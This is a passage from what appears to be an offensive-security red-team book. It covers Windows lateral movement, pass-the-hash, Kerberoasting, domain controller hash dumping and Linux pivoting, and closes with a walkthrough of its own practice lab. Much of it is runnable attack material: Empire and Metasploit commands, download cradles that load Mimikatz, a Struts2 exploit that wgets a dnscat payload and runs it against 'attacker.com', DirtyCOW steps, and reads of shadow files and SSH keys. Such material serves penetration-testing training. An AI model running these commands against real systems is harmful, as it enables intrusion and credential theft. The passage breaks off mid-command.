Bloodhound\noutputs or shared workstation s, as attackers, we need to be able to\nimpersonate other users on our victim systems. \n \nThere are different ways to accomplish this using many of the tools we\nhave.  In terms of Metasploit, we should all be pretty familiar with the Post\nExploitation incognito (https://www .offensive-security .com/metasploit-\nunleashed/fun-incognito/) to steal tokens.  In Empire, we can use\nsteal_tokens to impersonate a user on that system.  I have noticed that\nsometimes stealing tokens can break our shells.  To avoid this, we can inject\na new agent into a running process owned by a dif ferent user . \n \nIn the following image, we phished an employee who ran our malware. \nThis allowed us to run in a process owned by that victim user\n(neil.pawstrong).  Once on that user's box, we pivoted to Buzz Clawdrin's\nsystem and spawned a new agent with WMI (Windows Management\nInstrumentation).  The issue here is that we are still under the process of our\ninitial victim, neil.pawstrong, as we used our cached credentials  to spawn a\nshell onto Buzz's host.  Therefore, instead of stealing tokens, we should use\nEmpire's psinject feature. \n \nPSInject in Empire \"has the ability to inject an agent into another process\nusing ReflectivePick to load up the .NET common language runtime into a\nprocess and execute a particular PowerShell command, all without starting\na new powershell.exe process! ” [http://bit.ly/2HDxj6x]  We use this to\nspawn a brand new agent running as a process owned by Buzz.C lawdrin, so\nthat we can now get his access permissions. \n \n \nMoving Laterally Off Y our Initial Host\nNow that you have found poten tial routes to move to, what are the options\nto gain code execution to those systems?  The most basic way is to use the\npermission of our current Active Directory user to gain contro l of another\nsystem.  For example, we might see a manager who has full access to their\nsubordinates’ machines, a conference/lab machine with multiple users who\nhave administrative privileges, a misconfiguration on internal systems, or\nsee that someon e manually added a user to the local admin group on that\nPC.  These are some of the ways we see a user have remote access to other\nworkstations on the network. Once on a compromised machine, we can\neither take the results from Bloodhound or rescan the network to see what\nmachines we have local access on: \n \nEmpire Module:\nsituational_awareness/network/powerview/find_localadmin_acc\ness\nMetasploit Module: http://bit.ly/2JJ7ILb\n \nEmpire's find_localadmin_access will query Active Directory for all\nhostnames and try to connect to them.  This is definitely a loud tool as it\nneeds to connect to every host and validate if it is a local administrator . \n \n \nAs we can see, the find_localadmin_access module identifi ed that our\ncompromised user does have access to the buzz.cyberspace kittens.local\nmachine.  This should be the same as when we ran Bloodhound.  To double\ncheck that we have access, I generally do non-interactive remote  commands\nlike dir \\\\[remote system]\\C$ and see that we have read/write permission to\nthe C drive.\n \n \nIn terms of lateral movement, there are several options to choose from. \nLet's first take a peek at the ones in Empire as they are genera lly the most\ncommon (pulled straight from Empire):\ninveigh_relay: Inveigh's SMB relay function. This module can\nbe used to relay incoming HTTP/Proxy NTLMv1/NTLMv2\nauthentication requests to an SMB tar get. If the authentication is\nsuccessfully relayed and the account has the correct privilege, a\nspecified command or Empire launcher will be executed on the\ntarget PSExec style.\ninvoke_executemsbuild: This function executes a powershell\ncommand on a local/remote host using MSBuild and an inline\ntask. If credentials are provided, the default administrative share\nis mounted locally .  This command will be executed in the\ncontext of the MSBuild.exe process without starting\nPowerShell.exe.\ninvoke_psremoting: Executes a stager on remote hosts using\nPSRemoting.  As long as the victim has psremoting enabled (not\nalways available), we can execute a PowerShell via this service.\ninvoke_sqloscmd: Executes a command or stager on remote\nhosts using xp_cmdshell.  Good ol' xp_cmdshell is back! \ninvoke_wmi: Executes a stager on remote hosts using WMI. \nWMI is almost always enabled and this is a great way to execute\nyour PowerShell payloads. \njenkins_script_console: Deploys an Empire agent to a windows\nJenkins server with unauthenticated access to script console.  As\nwe know , Jenkins servers are commonly seen and without\ncredentials usually means full RCE through the /script endpoint.\ninvoke_dcom: Invoke commands on remote hosts via\nMMC20.Application COM object over DCOM\n(http://bit.ly/2qxq49L).  Allows us to pivot without psexec,\nWMI or PSRemoting.     \ninvoke_psexec: Executes a stager on remote hosts using PsExec\ntype functionality .  This is the old school way using PsExec to\nmove our file and execute.  This could potentially set of f alarms,\nbut still a good method if there is nothing else available.\ninvoke_smbexec: Executes a stager on remote hosts using\nSMBExec.ps.  Instead of using PsExec, we can do a similar\nattack with samba tools.\ninvoke_sshcommand: Executes a command on a remote host via\nSSH.      \ninvoke_wmi_debugger: Uses WMI to set the debugger for a\ntarget binary on a remote machine to be cmd.exe or a stager . \nUsing Debugger tools like sethc (sticky keys) to execute our\nagents.\nnew_gpo_immediate_task: Builds an 'Immediate' schtask to\npush out through a specified GPO.  If your user account has\naccess to modify GPOs, module lets you push out an\n‘immediate’ scheduled task to a GPO that you can edit, allowing\nfor code execution on systems where the GPO is applied.\n[http://www .harmj0y .net/blog/empire/empire-1-5/]\n \nThese are just some of the easiest and most common techniques to move\nlaterally .  Later in the book, we will discuss some of the lesser common\ntechniques to get around the network.  On most networks, Windows\nManagement Instrumentation (WMI) is generally enabled as it is required\nfor managemen t of workstations.  Therefore we can use invoke_wmi to\nmove laterally .  Since we are using cached credentials and our account has\naccess to the remote host, we don't need to know the user's credentials.\n \nExecute on Remote System\nusemodule lateral_movement/invoke_wmi\nSet the Computer you are going to attack:\nset ComputerName buzz.cyberspacekittens.local\nDefine which Listener to use:\nset Listener http\nRemotely connect to that host and execute your malware:\nexecute\nInteract with the New Agent\nagents\ninteract <Agent Name>\nsysinfo\n \n \nLateral Movement with DCOM\nThere are a number of ways to move laterally once on a host.  If the\ncompromised account has access or you are able to create tokens with\ncaptured credentials, we can spawn different shells using WMI, PowerShell\nRemoting, or PSExec.  What if those methods are being monitored?  There\nare some cool Windows features that we can take advantage of by using the\nDistributed Component Object Model (DCOM).  DCOM is a Windows\nfeature for communicating between software components on different\nremote computers. \n \nYou can list all of a machine’ s DCOM applications using the PowerShell\ncommand: Get-CimInstance W in32_DCOMApplication\n \n \nPer @enigma0x3's research (https://enigma0x3.net/2017/01/23/lateral-\nmovement-via-dcom-round-2/), he identified that there are multiple objects\n(for example, ShellBrowserW indow and ShellW indows) that allows the\nremote executio n of code on a victim host.  When listing all the DCOM\napplications (as seen as above), you will come across a\nShellBrowserW indow object with a CLSID of C08AFD90-F2A1-1 1D1-\n8455-00A0C91F3880.  With that object identified, we can abuse this\nfeature to execute binaries on a remote workstation as long as our account\nhas access: \n \npowershell\n$([activator]::CreateInstance([type]::GetT ypeFromCLSID(\"C08\nAFD90-F2A1-1 1D1-8455-\n00A0C91F3880\",\"buzz.cyberspacekittens.local\"))).Navigate(\"c:\\\nwindows\\system32\\calc.exe\")\n \nThis will only execute files locally on the system and we cannot include any\ncommand line parameters to the executable (so no cmd /k style attacks). \nInstead, we can call files from remote systems and execute them, but note\nthat the user will get a pop-up warning.  In this case, I am currently on a\nvictim's host neil.cyberspacekittens.local that has administrative access to a\nremote workstation called buzz.  We are going to share one folder on neil's\nworkstation and host our malici ous payload.  Next, we can call the DCOM\nobject to execute our hosted file on the remote victim's (buzz) machine. \n \n$([activator]::CreateInstance([type]::GetT ypeFromCLSID(\"C08AFD90-\nF2A1-1 1D1-8455-\n00A0C91F3880\",\"buzz.cyberspacekittens.local\"))).Navigate(\"\\\\neil.cybersp\nacekittens.local\\Public\\adobeupdate.exe\")\n \n \nAs you can see in the next image, a pop-up was presented on Buzz's\nmachine about running an adobeupdate.exe file.  Although most users\nwould click and run this, it might get us caught.\n \n \nSo, the better route to take to avoid this issue would be to move the file over\n(something like mounting the victim's drive) prior to using DCOM to\nexecute that file.  @enigma0x3  took this even further and abused DCOM\nwith Excel Macros.  First, we would need to create our malicious Excel\ndocument on our own syste m and then use the PowerS hell script\n(https://bit.ly/2pzJ9GX) to execute this .xls file on the victim host. \n \nOne thing to note is that there are a multitude of other DCOM objects that\ncan get informat ion from systems, potentially start/stop services  and more. \nThese will definitely provide great starting points for additional research on\nDCOM functionalities.\n \nResources:\nhttps://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-\nround-2/\nhttps://enigma0x3.net/2017/09/1 1/lateral-movement-using-\nexcel-application-and-dcom/\nhttps://www .cybereason.com/blog/dcom-lateral-movement-\ntechniques\n \nPass-the-Hash\nThe old way of Pass-The-Hash (PTH) of local admin accounts has started to\ndisappear for the most part.  Although not completely gone, let’s quickly\nreview it.  PTH  attacks utilize the Windows NTLM hashes to authenticate\nto system s inste ad of using a user's credentials.  Why is this important? \nFirst off, hashes are easily recoverable using tools like Mimikatz, can be\npulled for local accounts (but require local admin access), are recoverable\nfrom dumping the domain controller (not clear text passwords), and more. \n \nThe most basic use of PTH is attacking the local administrator .  This is\ngenerally rare to find due to the fact that, by default, the local admin\naccount is now disabled and newer security features have surfac ed, such as\nLocal Administrator Password Solution (LAPS) which creates random\npasswords for each workstation .  In the past, getting the hash of the local\nadmin account on one workstation was identical across the organization,\nmeaning one compromise took out the whole company .\n \nOf course, the requirements for this are that you have to be a local\nadministrator on the system, that the local administrator account\n\"administrator\" is enabled, and that it is the RID 500 account (meaning it\nhas to be the original administra tor account and cannot be a newly created\nlocal admin account). \n \nCommand: shell net user administrator\nUser name                 Administrator\nFull Name                   \nComment                   Built-in account for administering the\ncomputer/domain\nUser's comment              \nCountry/region code 000 (System Default)\nAccount active            Y es\nAccount expires          Never\n \nIf we see that the account is active, we can try to pull all the hashes from\nthe local machine.  Remember that this won't include any domain hashes: \nEmpire Module: powershell/credentials/powerdump\nMetasploit Module: http://bit.ly/2qzsyDI\n \nExample:\n(Empire: powershell/credentials/powerdump) > execute\nJob started: 93Z8PE\n \nOutput:\nAdministrator:500:\naad3b435b51404eeaad3b435b51404ee:3710b46790763e07ab0d\n2b6cfc4470c1:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16a\ne931b73c59d7e0c089c0:::\n \nWe could either use Empire (credentials/mimikatz/pth) or we can boot up\nthe trusted psexec, submit our hashes, and execute our custom payloads, as\nseen in the image below:\n \n \nAs previously mentioned, this is the old way of moving laterally and is a\nrare find.  If you are still lookin g at abusing Local Administrator accounts,\nbut are in an environment that has LAPS (Local Administrato r Password\nSolution), you can use a couple of different tools to pull them out of Active\nDirectory .  This assumes you already have a privileged domain admin or\nhelpdesk type account:\nhttps://github.com/rapid7/metasploit-\nframework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb\nldapsearch -x -h 10.100.100.200 -D \"elon.muskkat\" -w password\n-b \"dc=cyberspacekittens,dc=local\" \"(ms-MCS-AdmPwd=*)\"\nms-MCS-AdmPwd [https://room362.com/post/2017/dump-laps-\npasswords-with-ldapsearch/]\n \nThis is a great way to keep moving laterally without burning your helpdesk\nuseraccount. \n \nGaining Cr edentials fr om Service Accounts\nWhat if you find yourself in a scenario where you are a limite d user, can't\npull passwords from memory , and had no luck with passwords on the host\nsystem... what do you do next?  Well, one of my favorite attacks is called\nKerberoasting. \n \nWe all know that there are flaws with NTLM due to one-way hashes with\nno salts, replay attacks, and other traditional problems, which is why many\ncompanies have been moving to Kerberos.  As we know , Kerberos is a\nsecure method for authenticating a request for a service in a computer\nnetwork.  We won't go too deep into the implementation of Kerberos in\nWindows. However , you should know that the Domain Controller typically\nacts as the Ticket Granting Server; and users on the network can request\nTicket Granting T ickets to gain access to resources. \n \nWhat is the Kerberoast attack?   As an attacker , we can reque st Kerberos\nservice tickets for any of the SPNs of a target service account that we pulled\nearlier .  The vulnerability lies in the fact that when a service ticket is\nrequested from the Domain Controller , that ticket is encrypted with the\nassociated servic e user’s NTLM hash.  Since any ticket can be requested by\nany user, this means that, if we can guess the password to the associated\nservice user’s NTLM hash (that encrypted the ticket), then we now know\nthe password to the actual servic e account.  This may sound a bit confusing,\nso let's walk through an example. \n \nSimilar to what we did before, we can list all the SPN services.  These are\nthe service accounts for which we are going to pull all the Kerberos tickets:\nsetspn -T cyberspacekittens.local -F -Q */*\n \nWe can either target a single user SPN or pull all the user Kerberos tickets\ninto our user's memory: \nTargeting a single User:\npowershell Add-T ype -AssemblyName\nSystem.IdentityModel; New-Object\nSystem.IdentityModel.T okens.KerberosRequestorSec\nurityT oken -Ar gumentList \"HTTP/CSK-\nGITHUB.cyberspacekittens.local\"\nPulling All User T ickets into Memory\npowershell Add-T ype -AssemblyName\nSystem.IdentityModel; IEX (New-Object\nNet.W ebClient).DownloadString(\"https://raw .githubus\nercontent.com/nidem/kerberoast/master/GetUserSPNs\n.ps1\") | ForEach-Object {try{New-Object\nSystem.IdentityModel.T okens.KerberosRequestorSec\nurityT oken -Ar gumentList\n$_.ServicePrincipalName}catch{}}\nOf course, you can also do this with PowerSploit:\nhttps://powersploit.readthedocs.io/en/latest/Recon/Inv\noke-Kerberoast/\n \n \nIf successful, we have importe d either one or many differen t Kerberos\ntickets into our victim computer 's memory .  We now need a way to extract\nthe tickets.  T o do this, we can use good ol' Mimikatz Kerberos Export:\npowershell.exe -exec bypass IEX (New-Object\nNet.W ebClient).DownloadString('http://bit.ly/2qx4kuH');\nInvoke-Mimikatz -Command '\"\"\"kerberos::list /export\"\"\"'\n \nOnce we export the tickets, they will reside on our victim's machine.  We\nwill have to download them off of their systems before we can start\ncracking them.  Remember that the tickets are encrypted with the service\naccount's NTLM hash.  So, if we can guess that NTLM hash, we can read\nthe ticket, and now know the service account’ s password as well.  The\neasiest way to crack accounts is using a tool called tgsrepcrack (JTR and\nHashcat do also support crackin g Kerberoast, which we will talk about in a\nsecond). \n \nUsing Kerberoast to crack tickets:\ncd /opt/kerberoast\npython tgsrepcrack.py [password wordlist] [kirbi\ntickets - *.kirbi]\n \n \nIn this case, the password for the service account csk-github was\n“P@ssw0rd!” \n \nOf course, there is a PowerShell module in Empire that does all the hard\nwork for us.  This is located under\npowershell/credentials/invoke_kerberoast\n(https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-\nKerberoast.ps 1).  You can output the results in John the Ripper or even Hashcat\nformats to crack the passwords.  I have previously had some issues running\nthe PowerShell script in very large environments, so the fallba ck is to use\nPowerShell and Mimikatz to pull all the tickets down.\n \n \nDumping the Domain Controller Hashes\nOnce we have obtained Domain Administrative access, the old way to pull\nall the hashes from the DC was to run commands on the domain controller\nand use Shadow Volume or Raw copy techniques to pull off the Ntds.dit\nfile. \n \nReviewing the V olume Shadow Copy T echnique\nSince we do have access to the file system and can run comm ands on the\ndomain controller , as an attacker , we want to grab all the Domain hashes\nstored in the Ntds.dit file.  Unfortunately , that file is const antly being\nread/written to and even as system, we do not have access to read or copy\nthat file.  Luckily for us, we can take advantage of a W indows feature called\nVolume Shadow  Copy Service (VSS), which will create a snaps hot copy of\nthe volume.  We can then read the Ntds.dit file from that copy and pull it off\nthe machine.  This would includ e stealing the Ntds.dit, System, SAM, and\nBoot Key files.  Lastly , we need to clean our tracks and delete the volume\ncopy:\n \nC:\\vssadmin create shadow /for=C:\ncopy \\\\?\n\\GLOBALROOT\\Device\\HarddiskV olumeShadowCopy[DISK_\nNUMBER]\\windows\\ntds\\ntds.dit .\ncopy \\\\?\n\\GLOBALROOT\\Device\\HarddiskV olumeShadowCopy[DISK_\nNUMBER]\\windows\\system32\\config\\SYSTEM .\ncopy \\\\?\n\\GLOBALROOT\\Device\\HarddiskV olumeShadowCopy[DISK_\nNUMBER]\\windows\\system32\\config\\SAM .\nreg SA VE HKLM\\SYSTEM c:\\SYS\nvssadmin delete shadows /for= [/oldest | /all | /shadow=]\n \nNinjaCopy\nNinjaCopy (http://bit.ly/2HpvKw j) is another tool that, once on the Domain\nController , can be used to grab the Ntds.dit file.  NinjaCopy \"copies a file\nfrom an NTFS partitioned volume by reading the raw volume and parsing\nthe NTFS structures. This bypasses file DACL's, read handle locks, and\nSACL's. You must be an admini strator to run the script. This can be used to\nread SYSTEM files which are normally locked, such as the NTDS.dit file\nor registry hives.” [http://bit.ly/2HpvKwj]\nInvoke-NinjaCopy -Path \"c:\\windows\\ntds\\ntds.dit\" -\nLocalDestination \"c:\\windows\\temp\\ntds.dit\"\n \nDCSync\nNow that we have reviewed the old methods of pulling hashes from the DC\n—which require d you to run system commands on the DC and generally\ndrop files on that machine—let’ s move onto the newer methods.  More\nrecently , DCSync, written by Benjamin Delpy and Vincent Le Toux, was\nintroduced and changed the game on dumping hashes from Domain\nControllers.  The concept of DCSync is that it impersonates a Domain\nController to request all the hashes of the users in that Domain.  Let that\nsink in for a second.  This means, as long as you have permissions, you do\nnot need  to run any commands  on the Domain Controller and you do not\nhave to drop any files on the DC. \n \nFor DCS ync to work, it is important to have the proper permissions to pull\nhashes from a Domain Contr oller.  Generally limited to the Domain\nAdmins, Enterprise Admins, Domain Controllers groups, and anyone with\nthe Replicating Changes permissions set to Allow (i.e., Replicating\nChanges All/Replicating Directory Changes), DCSync will allow your user\nto perfo rm this attack.  This attack was first developed in Mimikatz and\ncould be run with the following command:\nLsadump::dcsync /domain:[YOUR DOMAIN] /user:\n[Account_to_Pull_Hashes]\n \nEven better , DCSync was pulled into tools like PowerShell Emp ire to make\nit even easier . \n \nModule for Empire: powershell/credentials/mimikatz/dcsync_hashdump\n \n \nLooking at the DCSync hashdu mp, we see all the NTLM hashes for the\nusers in Active Directory .  Additionally , we have the krbtgt NTLM hash,\nwhich means we now (or in future campaigns) can perform Golden Ticket\nattacks.\n \nLateral Movement via RDP over the VPS\nIn today 's world, with a ton of Next Gen AV, running WMI /PowerShell\nRemoting/PSExec laterally between computers isn't always the best option. \nWe are also seeing that some organizations are logging all Windows\nCommand prompts.  To get around all of this, we sometimes  need to go\nback to basics for lateral movement.  The issue with using VPS servers is\nthat it is only a shell with no GUI interface.  Therefore, we will\nroute/proxy/forward our traffic from our attacker host, throug h the VPS,\nthrough our compromised hosts , and finally laterally to our next victim. \nLuckily for us, we can use native tools to accomplish most of this.\n \n \n \nFirst, we will need to set up a VPS server , enable ports from the internet,\nconfigure Metasploit with PTF, and infect your initial victim with\nMeterpreter .  We could do this with Cobalt Strike or other frameworks, but\nwe will use Meterpreter in this case.\n \nWe can take advantage of the default SSH client by using Local Port\nForwarding (-L).  In this scena rio, I am using my Mac, but this could be\ndone on a Windows or Linux system as well.  We are going to connect to\nour VPS over SSH using our SSH key.  We are also going to configure a\nlocal port, in this case 3389 (RDP), on our attacker machine to forward any\ntraffic made to that port to our VPS.  When that traffic over that port is\nforwarded to our VPS, it will then send that traffic to localhost on port 3389\non the VPS.  Finally, we need to set up a port listening on our VPS on port\n3389 and set up a port forward through our compromised victim using\nMeterpreter's port forward feature to route to our victim's system.\n \n1. Infect our victim with a Meterpreter payload.\n2. SSH from our attacker machine and set up the Local Port\nForward on our attacker system (listen on port 3389 locally) to\nsend all traf fic destined for that port to the VPS's localhost port\non 3389.\nssh -i key .pem ubuntu@[VPS IP] -L\n127.0.0.1:3389:127.0.0.1:3389\n3. Set up a port forward on the Meterpreter session to listen on the\nVPS on port 3389 and send that traf fic through our Infected\nMachine to the next lateral movement server\nportfwd add -l 3389 -p 3389 -r [V ictim via RDP IP\nAddress]\n4. On our Attacker Machine, open our Microsoft Remote Desktop\nClient, set your connection to your own localhost - 127.0.0.1 and\nenter the V ictim's credentials to connect via RDP .\n \n \n \n \nPivoting in Linux\nPivoting in Linux hasn't change d too much over the years.  Usually if you\nare using  something like dnscat2 or Meterpreter , they all suppo rt their own\nforwarding.\ndnscat2:\nlisten 127.0.0.1:9999 <tar get_IP>:22\nMetasploit\npost/windows/manage/autoroute\nMetasploit Socks Proxy + Proxychains\nuse auxiliary/server/socks4a\nMeterpreter:\nportfwd add –l 3389 –p 3389 –r  <tar get_IP>\n \nIf you are lucky to get an SSH shell, there are a number of ways we can\npivot through that system.  How might we get an SSH shell?  In many\ncases, once we get either Local File Inclusion (LFI) or Remote Code\nExecution (RCE ), we can try to privilege escalate to read the /etc/shadow\nfile (and password crack) or we can pull some Mimikatz style trickery . \n \nJust like Windows and Mimikatz, Linux systems also run into the same\nissue where passwords are be stored in clear text.  A tool written by\n@hunter gregal dumps specific processes that have a high probability of\ncontaining the user's passwords in clear text.  Although this only works on a\nlimited number of Linux system s to date, the same concepts can be used\nacross the board.  You can see exactly what systems and from where\npasswords are being grabbed here: \nhttps://github.com/hunter gregal/mimipenguin.\n \n \nOnce we get credentials on our compromised hosts and can SSH back in,\nwe can tunnel our traffic and pivot between boxes.  Within SSH, we have\nsome great features that allow us to perform this pivoting:\nSetting up Dynamic Sock Proxy to use proxychains to pivot all\nof our traf fic through our host:\nssh -D 127.0.0.1:8888 -p 22 <user>@<T arget_IP>\nBasic Port Forwards for a single port:\nssh <user>@<T arget_IP> -L 127.0.0.1:55555:\n<Target_to_Pivot_to>:80\nVPN over SSH.  This is an awesome feature that makes it\npossible to tunnel layer 3 network traf fic of SSH. \nhttp://bit.ly/2EMpPfb\n \nPrivilege Escalation\nLinux Privilege escalation is just like Windows, for the most part.  We look\nfor vulnerable services that we can write to, sticky bit misconfigurations,\npasswords in flat files, world -writable files, cronjobs, and, of course,\npatching issues. \n \nIn terms of effectively and efficiently parsing a Linux box for privilege\nescalation issues, we can use a few tools to do all the legwork for us. \n \nBefore we do any sort of privil ege escalation exploits, I like to first get a\ngood read on the Linux host and identify all the information about the\nsystem.  This includes users, services, cronjobs, versions of software, weak\ncreds, misconfig ured file permissions, and even docker information.  We\ncan use a tool called LinEnum to do all the dirty work for us\n(https://github.com/rebootuser/LinEnum). \n \n\n \nThis is a very long report on everything you could ever want to know about\nthe underlying system and is great to have for future campaigns. \n \nOnce we gain information abou t the system, we try to see if we can exploit\nany of these vulnerabilities.  If we can't find any sticky bit vulnerabilities or\nabuse misconfigurations in servi ces/cronjobs, we go straight for exploits on\nthe system/applications.  I try to do these last as there is always  a potential\npossibility to halt/brick the box.\n \nWe can run a tool called linux-exploit-suggester\n(https://github.com/mzet-/linux-exploit-suggester) to analyze the host\nsystem and identify missing  patches and vulnerabilities.  Once a\nvulnerability is identified, the tool will also provide you with a link to the\nPoC exploit. \n \n \nNow , what are we looking for to exploit?  This is where experience and\npractice really come into play.  In my lab, I will have a huge number of\ndifferent Linux versions configured to validate that these exploits won't\ncrash the underlying system.  One of my favorite vulnerabil ities in this\nscenario is DirtyCOW . \n \nDirtyCOW is \"a race condition was found in the way Linux kernel's\nmemory subsystem handled breakage of the read only private mappings\nCOW situation on write access.  An unprivileged local user could use this\nflaw to gain write access to otherwise read only memory mappings and thus\nincrease\ntheir privileges on the system.” [https://dirtycow .ninja/] \n \nIn short, this vulnerability allows an attacker to go from a non-privileged\nuser to root via kernel vulnera bilities.  This is the best type of privilege\nescalation we could ask for!  The one issue though is that it is known to\ncause kernel panics, so we have to make sure to use the right versions on\nthe right Linux kernels. \n \nTesting DirtyCOW on Ubuntu (ubuntu 14.04.1 LTS 3.13.0 -32-generic\nx86_64):\nDownload the DirtyCOW payload\nwget http://bit.ly/2vdh2Ub -O dirtycow-mem.c\nCompile the DirtyCOW payload\ngcc -W all -o dirtycow-mem dirtycow-mem.c -ldl -\nlpthread\nRun DirtyCOW to get to system\n./dirtycow-mem\nTurn of f periodic writeback to make the exploit stable\necho 0 > /proc/sys/vm/dirty_writeback_centisecs\nTry reading the shadow file\ncat /etc/shadow\n \nLinux Lateral Movement Lab\nThe problem with lateral movement is that it is hard to practice without\nhaving an environment set up to pivot.  So, we present you the CSK Secure\nNetwork Lab.  In this lab, you are going to pivot between boxes , use recent\nexploits and privilege escalation attacks, and live off the land in a Linux\nenvironment.\n \nSetting Up the V irtual Environment\nThe setup for this virtual environment lab is slightly complex.  This is\nbecause the network is going to require three different static virtual\nmachines to run and there is some prior setting up required on your part. \nAll this is tested in VMW are W orkstation and VMware Fusion, so if you are\nusing V irtualBox, you might have to play around with it.\n \nDownload the Three V irtual Machines:\nhttp://thehackerplaybook.com/get.php?type=csk-lab\nAlthough you should not need the root accounts for these boxes,\nhere is the username/password, just in case: hacker/changeme.\n \nAll three of the virtual machines  are configured to use the NAT Networking\nInterface.  For this lab to work, you will have to configure your Virtual\nMachine's NAT settings in VMW are to use the 172.16.250.0/24 network. \nTo do this in W indows VMW are W orkstation:\nIn the menu bar , go to Edit -> virtual network editor -> change\nsettings\nSelect the interface for type NA T (mine is VMnet8)\nChange Subnet IP 172.16.250.0 and hit apply\n \nIn OSX, it is more complicated.  Y ou will need to:\nCopy the original dhcpd.conf as a backup\nsudo cp /Library/Preferences/VMware\\\nFusion/vmnet8/dhcpd.conf\n/Library/Preferences/VMware\\\nFusion/vmnet8/dhcpd.conf.bakup\nEdit the dhcpd.conf file to use 172.16.250.x instead of the\n192.168.x.x networks\nsudo vi /Library/Preferences/VMware\\\nFusion/vmnet8/dhcpd.conf\nEdit the nat.conf to use the correct gateway\nsudo vi /Library/Preferences/VMware\\\nFusion/vmnet8/nat.conf\n# NA T gateway address\nip = 172.16.250.2\nnetmask = 255.255.255.0\nRestart the service:\nsudo /Applications/VMware\\\nFusion.app/Contents/Library/services/services.sh --\nstop\nsudo /Applications/VMware\\\nFusion.app/Contents/Library/services/services.sh --\nstart\n \nNow , you shoul d be able start your THP Kali VM in NAT mode and get a\nDHCP IP in the 172.16.250.0/2 4 range.  If you do, boot up all three other\nlab boxes at the same time and start hacking away . \n \nAttacking the CSK Secur e Network\nYou have finally pivoted your way out of the Windows environment into\nthe secure production network.  From all your reconnaissance and research,\nyou know that all the secrets are stored here.  This is one of their most\nprotected netwo rks and we know they have segmented their secure\ninfrastructure.  From their documentation, it looks like there are multiple\nVLANS to compromise and it seems you will have to pivot between boxes\nto get to the vault database.  This is everything you have trained for…\n \nPivoting to the outside of the Secure Network area, you see that the network\nrange configured for this environment is in the 172.16.250.0/24 network. \nSince you don't know too much about this network, you start by kicking off\nsome very light nmap scans.  You need to identify which systems are\naccessible from outside this network in order to determine how you can\nstart your attack. \n \nScan the Secure Network:\nnmap 172.16.50.0/24\n \nYou notice there are three boxes up and running, but only one of them has\nweb ports enabled.  It looks like the other two boxes are isolated from\noutside the secure network, which means we will have to compromise the\n172.16.250.10 box first to be able to pivot into the other two servers. \nVisiting the first box (172.16.250.10), you see that Apache Tomcat is\nlistening on port 8080 and some openCMS is on port 80.  Running a web\nfuzzer you notice that the open CMS page is also running Apache Struts2\n(/struts2-showcase).  Instantly , flashbacks of the Equifax breach hit you like\na brick.  You think to yourself, this is too good to be true, but you have to\ncheck anyway .  You run a quick search on msfconsole and test the exploit\n\"struts2_content_type_ognl\". \n \n \nWe know that CSK heavily monitors their protected network traffic and\ntheir internal servers may not allow direct access to the corporate network. \nTo get around this, we are going to have to use our DNS C2 payload with\ndnscat2 to communicate over UDP instead of TCP.  Of course in the real\nworld, we migh t use an authoritative DNS server , but for lab sake, we will\nbe our own DNS server .\n \n[THP Kali Machine]\nThe THP Kali custom virtual machine should have all the tools to perform\nthe attacks.\nWe need to host our payload on a webserver , so that we can have\nour Metasploit payload grab the dnscat malware.  Inside the\ndnscat2 client folder is the dnscat binary .\ncd /opt/dnscat2/client/\npython -m SimpleHTTPServer 80\nStart a dnscat server\ncd /opt/dnscat2/server/\nruby ./dnscat2.rb\nRecord your secret key for dnscat\n \n \nOpen a New T erminal and load Metasploit\nmsfconsole\nSearch for struts2 and load the struts2 exploit\nsearch struts2\nuse exploit/multi/http/struts2_content_type_ognl\nConfigure the struts2 exploit to grab our dnscat payload and\nexecute on the victim server .  Make sure to update your IP and\nsecret key from before.\nset RHOST 172.16.250.10\nset RPOR T 80\nset T ARGETURI struts2-showcase/showcase.action\nset PAYLOAD cmd/unix/generic\nset CMD wget http://<your_ip>/dnscat -O /tmp/dnscat\n&& chmod +x /tmp/dnscat && /tmp/dnscat --dns\nserver=attacker .com,port=53 --secret=<Y our Secret\nKey>\nrun\nOnce the payload executes, you will not get any sort of\nconfirmation in Metasploit as we used a dnscat payload.  Y ou\nwill need to check your dnscat server for any connections using\nDNS traf fic.\n \n \nBack on your dnscat2 server , check your newly executed\npayload and create a shell terminal.\nInteract with your first payload\nwindow -i 1\nSpawn a Shell process\nshell\nGo back to the main menu with the keyboard buttons\nctrl + z\nInteract with your new shell\nwindow -i 2\nType in shell commands\nls\n \n \nYou have compromised the OpenCMS/Apache Struts server!  Now what? \nYou spend some time reviewing the server and looking for juicy secrets. \nYou remember that the server is running the OpenCMS web application and\nidentify that the app is configured under /opt/tomcat/webapps/kittens.  In\nreviewing the configuration file of the OpenCMS properties, we find the\ndatabase, username, password, and IP address of 172.16.250.10.\n \nRetrieving the database information:\ncat /opt/tomcat/webapps/kittens/WEB-\nINF/config/opencms.properties\n \n \nWe connect to the database, but we do not see much.  The problem is that\nwe are currently a limited tomcat user, which is really hindering our attack.\nTherefore, we need to find a way to escalate.  Running post exploitation\nreconnaissance (uname -a && lsb_release -a) on the server , you identify\nthat this is a pretty old version of Ubuntu.  Luckily for us, this server is\nvulnerable to the privilege escalation vulnerability DirtyCOW .  Let's create\na DirtyCOW binary and get to root!\n \nPrivilege Escalation through dnscat:\nDownload and compile DirtyCOW :\ncd /tmp\nwget http://bit.ly/2vdh2Ub -O dirtycow-mem.c\ngcc -W all -o dirtycow-mem dirtycow-mem.c -ldl -\nlpthread\n./dirtycow-mem\nTry to keep the DirtyCOW exploit stable and allow reboots for\nkernel panics\necho 0 > /proc/sys/vm/dirty_writeback_centisecs\necho 1 > /proc/sys/kernel/panic && echo 1 >\n/proc/sys/kernel/panic_on_oops&& echo 1 >\n/proc/sys/kernel/panic_on_unrecovered_nmi && echo\n1 > /proc/sys/kernel/panic_on_io_nmi && echo 1 >\n/proc/sys/kernel/panic_on_warn\nwhoami\n \n \nNote: DirtyCOW is not a very stable privilege escalation.  If you are having\nproblems with your exploit, check out my GitHub page for a more stable\nprocess of creating a setuid binary here:\nhttps://raw .githubusercontent.com/cheetz/dirtycow/master/THP-\nLab\nIf you are still having problems , the other option is to log into\nthe initial server over SSH and execute the dnscat payload as\nroot.  To log in, use the creden tials hacker/changeme and sudo\nsu - to root.\n \nNow , you have become root on the system due to the lack of patching on\nthe host system.  As you start pillaging the box for secrets again , you come\nacross root's bash history file.  Inside this file you find an SSH command\nand private SSH key reference.  We can take this SSH key and log into our\nsecond box, 172.16.250.30:\ncat ~/.bash_history\nhead ~/.ssh/id_rsa\nssh -i 